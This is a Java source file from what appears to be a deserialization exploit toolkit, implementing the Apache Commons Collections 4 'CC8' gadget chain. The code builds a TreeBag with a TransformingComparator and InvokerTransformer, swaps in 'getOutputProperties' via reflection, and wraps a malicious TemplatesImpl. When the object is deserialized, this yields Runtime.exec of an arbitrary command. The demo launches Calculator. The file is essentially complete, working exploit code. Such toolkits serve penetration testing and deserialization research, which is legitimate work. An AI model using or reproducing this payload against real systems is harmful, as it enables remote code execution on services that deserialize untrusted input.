package xyz.eki.marshalexp.poc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import xyz.eki.marshalexp.sink.jdk.GTemplates;
import xyz.eki.marshalexp.utils.ReflectUtils;
import xyz.eki.marshalexp.utils.SerializeUtils;

/*
	Gadget chain:
        org.apache.commons.collections4.bag.TreeBag.readObject
        org.apache.commons.collections4.bag.AbstractMapBag.doReadObject
        java.util.TreeMap.put
        java.util.TreeMap.compare
        org.apache.commons.collections4.comparators.TransformingComparator.compare
        org.apache.commons.collections4.functors.InvokerTransformer.transform
        java.lang.reflect.Method.invoke
        sun.reflect.DelegatingMethodAccessorImpl.invoke
        sun.reflect.NativeMethodAccessorImpl.invoke
        sun.reflect.NativeMethodAccessorImpl.invoke0
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer
            ... (TemplatesImpl gadget)
        java.lang.Runtime.exec
 */
public class CC8 implements POC{

    public Object getPocObject(TemplatesImpl templates) throws Exception {

        // setup harmless chain
        final InvokerTransformer transformer = new InvokerTransformer("toString", null,null);

        // define the comparator used for sorting
        TransformingComparator comp = new TransformingComparator(transformer);

        // prepare CommonsCollections object entry point
        TreeBag tree = new TreeBag(comp);
        tree.add(templates);

        // getOutputProperties or newTransformer
        ReflectUtils.setFieldValue(transformer, "iMethodName", "getOutputProperties");
        return tree;
    }

    @Override
    public Object getPocObject(byte[] clzBytes) throws Exception {
        return getPocObject(GTemplates.getEvilTemplates(clzBytes));
    }

    @Override
    public Object getPocObject(String cmd) throws Exception {
        return getPocObject(GTemplates.getEvilTemplates(cmd));
    }

    public static void main(String[] args) throws Exception{
        String cmd= "open -a Calculator.app";
        Object poc = new CC8().getPocObject(cmd);
        SerializeUtils.deserialize(SerializeUtils.serialize(poc));
    }

}
